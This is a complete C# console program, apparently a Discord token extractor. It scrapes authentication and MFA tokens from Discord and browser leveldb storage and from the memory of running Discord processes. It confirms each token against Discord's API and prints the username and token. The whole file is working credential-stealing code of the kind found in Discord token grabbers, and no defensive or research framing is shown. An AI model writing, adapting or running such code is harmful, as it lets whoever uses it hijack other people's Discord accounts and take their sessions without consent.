using System.Diagnostics;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

const uint PROCESS_VM_READ          = 0x0010;
const uint PROCESS_QUERY_INFORMATION = 0x0400;
const uint MEM_COMMIT = 0x1000;
const uint MEM_IMAGE  = 0x1000000;

const string RST  = "\x1b[0m";
const string RED  = "\x1b[31m";
const string GRN  = "\x1b[32m";
const string YLW  = "\x1b[33m";
const string CYN  = "\x1b[36m";
const string MGT  = "\x1b[35m";
const string CYNB = "\x1b[96m";

var tokenRe    = new Regex(@"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38}");
var mfaRe      = new Regex(@"mfa\.[\w-]{84}");
var authAnchor = Encoding.ASCII.GetBytes("Authorization");
var v8Anchor   = new byte[] { 0x6D, 0x00, 0x00, 0x00, 0x05, 0x74, 0x6F, 0x6B, 0x65, 0x6E, 0x6D, 0x00, 0x00, 0x00, 0x03 };
var readableProtects = new HashSet<uint> { 0x02, 0x04, 0x08, 0x20, 0x40, 0x80 };

EnableAnsi();
Console.Write("\x1b[2J\x1b[H");

var local = Environment.GetEnvironmentVariable("LOCALAPPDATA") ?? "";
var roam  = Environment.GetEnvironmentVariable("APPDATA")      ?? "";

var paths = new Dictionary<string, string>
{
    ["Discord"]        = Path.Combine(roam, "discord",        @"Local Storage\leveldb"),
    ["Discord Canary"] = Path.Combine(roam, "discordcanary",  @"Local Storage\leveldb"),
    ["Discord PTB"]    = Path.Combine(roam, "discordptb",     @"Local Storage\leveldb"),
    ["Chrome"]         = Path.Combine(local, @"Google\Chrome\User Data\Default\Local Storage\leveldb"),
    ["Edge"]           = Path.Combine(local, @"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
    ["Brave"]          = Path.Combine(local, @"BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
};

var candidates = new HashSet<string>();

Console.WriteLine($"{CYN}Scanning local files for Discord tokens...{RST}");
foreach (var (name, path) in paths)
{
    if (!Directory.Exists(path))
    {
        Console.WriteLine($"{RED}  Path not found: {path}{RST}");
        continue;
    }
    Console.WriteLine($"{CYN}  Scanning {name} at {path}{RST}");
    try
    {
        foreach (var file in Directory.EnumerateFiles(path))
        {
            var ext = Path.GetExtension(file).ToLowerInvariant();
            if (ext is not (".ldb" or ".log")) continue;
            try
            {
                var bytes = File.ReadAllBytes(file);
                var text  = Encoding.UTF8.GetString(bytes);
                foreach (Match m in tokenRe.Matches(text)) candidates.Add(m.Value);
                foreach (Match m in mfaRe.Matches(text))   candidates.Add(m.Value);
                Console.WriteLine($"{GRN}    Processed file: {Path.GetFileName(file)}{RST}");
            }
            catch (IOException) { continue; }
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"{RED}  Error scanning {name}: {ex.Message}{RST}");
    }
}

var validAccounts = new List<(string username, string token)>();

Console.WriteLine($"\n{CYNB}Validating tokens found in files...{RST}");
foreach (var token in candidates)
{
    var username = ValidateToken(token);
    if (username != null)
    {
        validAccounts.Add((username, token));
        Console.WriteLine($"{GRN}  Valid token found for user: {username}{RST}");
    }
}
if (validAccounts.Count == 0)
    Console.WriteLine($"{RED}No valid accounts found in files{RST}");

Console.WriteLine($"\n{CYN}Scanning for authorization headers and V8 token keys...{RST}");
var memCandidates = ScanDiscordProcesses();
Console.WriteLine($"{CYNB}Validating tokens found in memory...{RST}");
int foundInMemory = 0;
foreach (var token in memCandidates)
{
    if (validAccounts.Any(v => v.token == token)) continue;
    var username = ValidateToken(token);
    if (username != null)
    {
        validAccounts.Add((username, token));
        foundInMemory++;
        Console.WriteLine($"{GRN}  New valid token found in memory for user: {username}{RST}");
    }
}
if (foundInMemory == 0)
    Console.WriteLine($"{RED}No other accounts found using memory scan{RST}");

Console.WriteLine($"\n{CYNB}Following Discord Accounts Were Found:{RST}");
foreach (var (username, token) in validAccounts)
{
    Console.WriteLine($"{YLW}Username          :   {RST}{username}");
    Console.WriteLine($"{MGT}Account Token     :   {RST}{token}");
    Console.WriteLine();
}
if (validAccounts.Count == 0)
    Console.WriteLine($"{RED}No valid Discord accounts found{RST}");

Console.WriteLine($"\n{CYNB}Press Any Key To Exit...{RST}");
try { Console.ReadKey(true); }
catch (InvalidOperationException) { Console.ReadLine(); }
return;

// --- local functions ---

void EnableAnsi()
{
    var h = GetStdHandle(-11);
    GetConsoleMode(h, out var mode);
    SetConsoleMode(h, mode | 4);
}

string? ValidateToken(string token)
{
    try
    {
        using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
        http.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(token);
        http.DefaultRequestHeaders.UserAgent.ParseAdd("TokenExtractor/1.0");
        var resp = http.GetAsync("https://discord.com/api/v9/users/@me").Result;
        if (resp.StatusCode != System.Net.HttpStatusCode.OK) return null;
        var body = resp.Content.ReadAsStringAsync().Result;
        var m = Regex.Match(body, @"""username"":""([^""]+)""");
        return m.Success ? m.Groups[1].Value : null;
    }
    catch { return null; }
}

HashSet<string> ScanDiscordProcesses()
{
    var result = new HashSet<string>();
    var pids = Process.GetProcesses()
        .Where(p => { try { var n = p.ProcessName.ToLower(); return n is "discord" or "discordptb" or "discordcanary"; } catch { return false; } })
        .Select(p => p.Id).ToList();

    if (pids.Count == 0)
    {
        Console.WriteLine($"{RED}Discord is not running{RST}");
        return result;
    }

    var bearing = new List<(int pid, string name, string kind)>();
    foreach (var pid in pids)
    {
        var name = GetProcessName(pid);
        var kind = ClassifyPid(pid);
        if (kind is "main" or "renderer" or "unknown")
            bearing.Add((pid, name, kind));
    }

    Console.WriteLine($"{YLW}Discord processes: {pids.Count}, token-bearing: {bearing.Count}{RST}");
    if (bearing.Count == 0)
    {
        Console.WriteLine($"{RED}No token-bearing Discord processes{RST}");
        return result;
    }

    bool foundFast = false;
    foreach (var (pid, name, _) in bearing)
    {
        var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
        if (h == IntPtr.Zero) continue;
        foundFast |= ScanProcessFast(h, result);
        CloseHandle(h);
    }

    if (!foundFast)
    {
        Console.WriteLine($"{YLW}Fast scan found nothing, falling back to full memory scan...{RST}");
        foreach (var (pid, name, _) in bearing)
        {
            var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
            if (h == IntPtr.Zero) continue;
            ScanProcessFull(h, name, pid, result);
            CloseHandle(h);
        }
    }
    else
    {
        Console.WriteLine($"{GRN}Fast scan found candidates, skipping full heap scan.{RST}");
    }
    return result;
}

bool ScanProcessFast(IntPtr h, HashSet<string> out_set)
{
    bool any = false;
    long address = 0;
    int mbiSize = Marshal.SizeOf<MEMORY_BASIC_INFORMATION>();
    while (true)
    {
        if (WinVirtualQueryEx(h, (IntPtr)address, out MEMORY_BASIC_INFORMATION mbi, (uint)mbiSize) == 0) break;
        if (mbi.State == MEM_COMMIT && readableProtects.Contains(mbi.Protect)
            && (mbi.Type & MEM_IMAGE) == 0 && mbi.RegionSize > 0 && mbi.RegionSize < 50 * 1024 * 1024)
        {
            var buf = new byte[(int)mbi.RegionSize];
            if (WinReadProcessMemory(h, (IntPtr)address, buf, (nuint)mbi.RegionSize, out nuint bytesRead) && bytesRead > 0)
            {
                var hitIdx = FindAnchor(buf, (int)bytesRead);
                if (hitIdx >= 0)
                {
                    any = true;
                    int win = (int)Math.Min((long)(bytesRead - (nuint)hitIdx), 768);
                    var text = Encoding.UTF8.GetString(buf, hitIdx, win);
                    foreach (Match m in tokenRe.Matches(text)) out_set.Add(m.Value);
                    foreach (Match m in mfaRe.Matches(text))   out_set.Add(m.Value);
                }
            }
        }
        long next = address + (long)mbi.RegionSize;
        if (next <= address) break;
        address = next;
    }
    return any;
}

void ScanProcessFull(IntPtr h, string name, int pid, HashSet<string> out_set)
{
    long total = 0;
    Console.WriteLine($"{YLW}  {name} pid {pid} heap scan:{RST}");
    long address = 0;
    int mbiSize = Marshal.SizeOf<MEMORY_BASIC_INFORMATION>();
    while (true)
    {
        if (WinVirtualQueryEx(h, (IntPtr)address, out MEMORY_BASIC_INFORMATION mbi, (uint)mbiSize) == 0) break;
        if (mbi.State == MEM_COMMIT && readableProtects.Contains(mbi.Protect)
            && (mbi.Type & MEM_IMAGE) == 0 && mbi.RegionSize > 0 && mbi.RegionSize < 50 * 1024 * 1024)
        {
            Console.WriteLine($"{YLW}    region 0x{address:X16} size {mbi.RegionSize}{RST}");
            var buf = new byte[(int)mbi.RegionSize];
            if (WinReadProcessMemory(h, (IntPtr)address, buf, (nuint)mbi.RegionSize, out nuint bytesRead) && bytesRead > 0)
            {
                total += (long)bytesRead;
                var text = Encoding.UTF8.GetString(buf, 0, (int)bytesRead);
                foreach (Match m in tokenRe.Matches(text)) out_set.Add(m.Value);
                foreach (Match m in mfaRe.Matches(text))   out_set.Add(m.Value);
            }
        }
        long next = address + (long)mbi.RegionSize;
        if (next <= address) break;
        address = next;
    }
    Console.WriteLine($"{YLW}    {name} pid {pid} heap size {total} bytes{RST}");
}

int FindAnchor(byte[] buf, int len)
{
    var span = buf.AsSpan(0, len);
    int i = span.IndexOf(authAnchor);
    if (i >= 0) return i;
    return span.IndexOf(v8Anchor);
}

string ClassifyPid(int pid)
{
    var h = WinOpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
    if (h == IntPtr.Zero) return "unknown";
    try
    {
        var pbi = new PROCESS_BASIC_INFORMATION();
        NtQueryInformationProcess(h, 0, ref pbi, Marshal.SizeOf<PROCESS_BASIC_INFORMATION>(), out _);
        if (pbi.PebBaseAddress == IntPtr.Zero) return "unknown";

        WinReadPointer(h, pbi.PebBaseAddress + 0x20, out nint pp, nint.Size);
        if (pp == IntPtr.Zero) return "unknown";

        var usBuf = new byte[Marshal.SizeOf<UNICODE_STRING>()];
        WinReadProcessMemory(h, pp + 0x70, usBuf, (nuint)usBuf.Length, out _);
        var us = Marshal.PtrToStructure<UNICODE_STRING>(Marshal.UnsafeAddrOfPinnedArrayElement(usBuf, 0));
        if (us.Length == 0 || us.Buffer == IntPtr.Zero) return "unknown";

        var cmdBuf = new byte[us.Length];
        WinReadProcessMemory(h, us.Buffer, cmdBuf, (nuint)us.Length, out _);
        string cl = Encoding.Unicode.GetString(cmdBuf);
        if (cl.Contains("--type=renderer"))    return "renderer";
        if (cl.Contains("--type=gpu-process")) return "gpu";
        if (cl.Contains("--type=utility"))    return "utility";
        if (cl.Contains("--type=crashpad"))   return "crashpad";
        return cl.Contains("--type=") ? "other" : "main";
    }
    catch { return "unknown"; }
    finally { CloseHandle(h); }
}

string GetProcessName(int pid)
{
    try { return Process.GetProcessById(pid).ProcessName; }
    catch { return "unknown"; }
}

// --- Win32 P/Invoke ---

[DllImport("kernel32.dll", EntryPoint = "OpenProcess")] static extern IntPtr WinOpenProcess(uint access, bool inherit, int pid);
[DllImport("kernel32.dll")] static extern void CloseHandle(IntPtr h);
[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)] static extern bool WinReadProcessMemory(IntPtr h, IntPtr baseAddr, byte[] buf, nuint size, out nuint read);
[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)] static extern bool WinReadPointer(IntPtr h, IntPtr baseAddr, out nint val, nint size);
[DllImport("kernel32.dll", EntryPoint = "VirtualQueryEx")] static extern int WinVirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION mbi, uint size);
[DllImport("ntdll.dll")]    static extern int NtQueryInformationProcess(IntPtr handle, int infoClass, ref PROCESS_BASIC_INFORMATION pbi, int size, out int returnSize);
[DllImport("kernel32.dll")] static extern IntPtr GetStdHandle(int nStdHandle);
[DllImport("kernel32.dll")] static extern bool GetConsoleMode(IntPtr h, out uint mode);
[DllImport("kernel32.dll")] static extern bool SetConsoleMode(IntPtr h, uint mode);

[StructLayout(LayoutKind.Sequential)]
struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebBaseAddress;
    public IntPtr Reserved2_0;
    public IntPtr Reserved2_1;
    public nint UniqueProcessId;
    public nint InheritedFromUniqueProcessId;
}

[StructLayout(LayoutKind.Sequential)]
struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

[StructLayout(LayoutKind.Sequential)]
struct MEMORY_BASIC_INFORMATION
{
    public IntPtr BaseAddress;
    public IntPtr AllocationBase;
    public uint   AllocationProtect;
    public nuint  RegionSize;
    public uint   State;
    public uint   Protect;
    public uint   Type;
}
